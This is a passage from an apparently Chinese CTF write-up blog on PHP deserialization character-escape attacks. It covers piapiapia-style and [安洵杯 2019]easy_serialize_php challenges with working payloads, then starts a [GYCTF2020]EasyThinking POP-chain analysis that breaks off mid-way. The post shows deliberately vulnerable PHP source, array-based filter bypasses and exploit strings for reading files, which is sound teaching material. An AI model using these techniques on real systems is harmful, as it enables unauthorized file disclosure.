<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:2:&#123;i:0;s:5:&quot;where&quot;;i:1;s:5:&quot;world&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>会替换为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:2:&#123;i:0;s:5:&quot;hacker&quot;;i:1;s:5:&quot;world&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>这样就会发现会出错，因为where是五个字符，而hacker是六个，对于出where以外的其他都是六字符，所以只有where会出错，因此这就是我们的利用点。当我们把hacker多余的这个r替换成<code>&quot;;i:1;s:5:&quot;world&quot;;&#125;</code>时，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:2:&#123;i:0;s:5:&quot;hacke&quot;;i:1;s:5:&quot;world&quot;;&#125;&quot;;i:1;s:5:&quot;world&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>php反序列化时会忽略后面的非法部分&quot;;i:1;s:5:“world”;}，可以反序列化成功。所以我们可以多写几个where，这样在替换时每多出的一个r就为我们构造字符串提供一个位置，我们需要<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>加在后面用来读config.php文件。共34个字符，因此需要加34的where，所以最后需要输入的数据为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>这样在反序列化后大概就是这情况：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;12345678901&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;ss@q.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;ca01h&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">204</span>:<span class="string">&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;s:<span class="number">39</span>:<span class="string">&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>此时这34个字符会包含在204个总字符内。<br>
替换为hacker后：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;12345678901&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;ss@q.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;ca01h&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">204</span>:<span class="string">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;s:<span class="number">39</span>:<span class="string">&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>因为hacker比where多一个字符，所以正好占据了这多余的34个字符，使得其逃逸了出来，便可以成功反序列化。</p>
<p>payload构造成功了，再找输入点。</p>
<blockquote>
<p>md5(Array()) = null<br>
sha1(Array()) = null<br>
ereg(pattern,Array()) = null<br>
preg_match(pattern,Array()) = false<br>
strcmp(Array(), “abc”) = null<br>
strpos(Array(),“abc”) = null<br>
strlen(Array()) = null</p>
</blockquote>
<p>下面的这个preg_math可以用数组绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, $_POST[<span class="string">&#x27;nickname&#x27;</span>]) || strlen($_POST[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200713150607.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200713150646.png" alt=""></p>
<h3 id="参考-v2">参考</h3>
<p><a href="https://xz.aliyun.com/t/7570#toc-9">https://xz.aliyun.com/t/7570#toc-9</a></p>
<p><a href="http://www.lin2zhen.top/index.php/archives/73/">http://www.lin2zhen.top/index.php/archives/73/</a></p>
<h2 id="安洵杯-2019-easy-serialize-php-v2">[安洵杯 2019]easy_serialize_php</h2>
<h3 id="考点-v10">考点</h3>
<ul>
<li>phpinfo信息搜集</li>
<li>PHP反序列化字符逃逸</li>
</ul>
<h3 id="解题-v10">解题</h3>
<p>上来就直接个源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$img</span>)</span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    $filter = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,$filter_arr).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">&#x27;&#x27;</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">$_SESSION[<span class="string">&#x27;function&#x27;</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode($_GET[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很容易看到有一个变量覆盖的漏洞，但是还不知道怎么利用，接着往下看。</p>
<p>传入<code>f=phpinfo</code>可以看到someting，试试看</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200713152851.png" alt=""></p>
<p>在每个php文件前面都自动包含了<code>d0g3_f1ag.php</code>，直接访问没有任何回显。</p>
<p>当<code>$function=show_image</code>的时候，会调用<code>file_get_contents</code>函数读取文件内容，如果我们能控制<code>$userinfo['img']</code>参数为<code>d0g3_f1ga.php</code>就可以读flag。</p>
<p>但是如果传入<code>img_path</code>参数的话会先对其base64编码然后sha1加密，是一个不可逆的操作。</p>
<p>那么再去看另外两个参数<code>function</code>和<code>user</code>，其中<code>user</code>也是硬编码无法利用，只能从<code>function</code>参数入手。此外，我们还要注意到有一个<code>filter</code>函数用于过滤<code>php</code>、<code>flag</code>、<code>php5</code>、<code>php4</code>和<code>fl1g</code>关键字。</p>
<blockquote>
<p>任何具有一定结构的数据，<strong>如果经过了某些处理而把结构体本身的结构给打乱了</strong>，则有可能会产生漏洞。</p>
</blockquote>
<p>那么这个地方就可以很明显的用到反序列化字符逃逸的漏洞，用于覆盖<code>$userinfo['img']</code>参数为<code>d0g3_f1ag.php</code>。首先看一下一个正常的序列化后的<code>$_SESSION</code>是什么样子的：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; $_SESSION[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">php &gt; $_SESSION[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">php &gt; $_SESSION[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">php &gt; print_r(serialize($_SESSION));</span><br><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;guest&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;phpinfo&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>我们要覆盖掉序列化后的<code>img</code>参数，也就是要插入<code>s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</code>，即</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;guest&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;phpinfo&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
<p>这里我们就可以利用变量覆盖漏洞来覆盖<code>$_SESSION[&quot;user&quot;]</code>和<code>$_SESSION[&quot;function&quot;]</code>的值。</p>
<p>假如我们赋值<code>$_SESSION[&quot;user&quot;]=flagflagflagflagflagflag</code>，<code>$_SESSION[&quot;function&quot;]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;</code>，那么序列化后<code>$serialize_info</code>为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;flagflagflagflagflagflag&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">59</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:28:&quot;</span>L3VwbG9hZC9ndWVzdF9pbWcuanBn<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
<p>过滤之后，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">59</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:28:&quot;</span>L3VwbG9hZC9ndWVzdF9pbWcuanBn<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
<p>其中<code>&quot;;s:8:&quot;function&quot;;s:59:&quot;a</code>刚好是24个字符，这样就可以控制后面的序列化内容。</p>
<p>所以最终的payload为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_SESSION[user]&#x3D;flagflagflagflagflagflag&amp;_SESSION[function]&#x3D;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&amp;function&#x3D;show_image</span><br></pre></td></tr></table></figure>
<h3 id="参考-v3">参考</h3>
<p><a href="https://xz.aliyun.com/t/6911#toc-3">官方writeup</a></p>
<p><a href="https://www.andseclab.com/2020/01/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/">AD攻防实验室——PHP反序列化字符逃逸</a></p>
<h2 id="GYCTF2020-EasyThinking">[GYCTF2020]EasyThinking</h2>
<h3 id="考点-v11">考点</h3>
<ul>
<li>POP链构造</li>
<li>PHP反序列化字符逃逸</li>
</ul>
<h3 id="解题-v11">解题</h3>
<p>下载<code>www.zip</code>审计源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;lib.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;update&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">&#x27;login&#x27;</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;你还没有登陆呢！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$users=<span class="keyword">new</span> User();</span><br><span class="line">$users-&gt;update();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>]===<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">	<span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>update.php</code>页面提示需要登录才能获得flag。</p>
<p>主要代码都在<code>lib.php</code>中，先来看一下User类</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;username&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">        $mysqli=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id=$mysqli-&gt;login(<span class="string">&#x27;select id,password from user where username=?&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;id)&#123;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;id&#x27;</span>]=<span class="keyword">$this</span>-&gt;id;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;login&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你的ID是&quot;</span>.$_SESSION[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你好！&quot;</span>.$_SESSION[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">        $age=$Info-&gt;age;</span><br><span class="line">        $nickname=$Info-&gt;nickname;</span><br><span class="line">        $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">&#x27;id&#x27;</span>],$Info,<span class="string">&quot;update user SET age=<span class="subst">$age</span>,nickname=<span class="subst">$nickname</span> where id=&quot;</span>.$_SESSION[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">        <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $age=$_POST[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">        $nickname=$_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;nickname);<span class="comment">//危</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>login</code>函数中调用<code>dbCtrl</code>类中的<code>login</code>函数执行SQL语句，<code>update</code>函数中有一个反序列化的地方，参数是<code>getNewInfo</code>函数的返回值。</p>
<p><code>getNewInfo</code>函数中<code>age</code>和<code>nickname</code>参数是可控的，传给了<code>Info</code>类</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Info&#123;</span><br><span class="line">    public $age;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public $CtrlCase;</span><br><span class="line">    public function __construct($age,$nickname)&#123;</span><br><span class="line">        $this-&gt;age&#x3D;$age;</span><br><span class="line">        $this-&gt;nickname&#x3D;$nickname;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __call($name,$argument)&#123;</span><br><span class="line">        echo $this-&gt;CtrlCase-&gt;login($argument[0]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后还要经过一次<code>safe</code>函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params">$parm</span>)</span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">&#x27;hacker&#x27;</span>,$parm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>替换之后改变了数据的结构，类似0CTF2016 piapiapia这道题，很可能会引发字符逃逸的漏洞。</p>
<p>接着看<code>dbCtrl</code>类</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=$_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=$_SESSION[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;连接失败，错误:&quot;</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;用户不存在!&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;密码错误！&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;token&#x27;</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//还没来得及写</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以知道的信息:</p>
<ol>
<li>用户名存在，且$this-&gt;password的md5的值与数据库查询用户密码相同。</li>
<li>或者token的值为admin</li>
</ol>
<p>这里有点像2019GXYCTF中的babySqli，是不是我们控制了sql语句，使用</p>
<ul>
<li><code>select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?</code></li>
<li>$this-&gt;password=1(1的md5的值为c4ca4238a0b923820dcc509a6f75849b)</li>
</ul>
<p>就可以通过登录密码的验证。</p>
<p>接下来构造POP链，先来找一下<code>__destruct</code>魔法方法，在<code>UpdateHelper</code>类中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$newInfo,$sql</span>)</span>&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现会把sql给echo出来，如果<code>$sql=new User()</code>的话，就会触发User内的__toString()魔术方法，该魔术方法内调用了<code>$nickname</code>属性的update()方法。虽然dbCtrl对象拥有update()方法，但是<code>$nickname</code>实例化成对象没意义。接着看<code>Info</code>类</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$age,$nickname</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=$nickname;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name,$argument</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
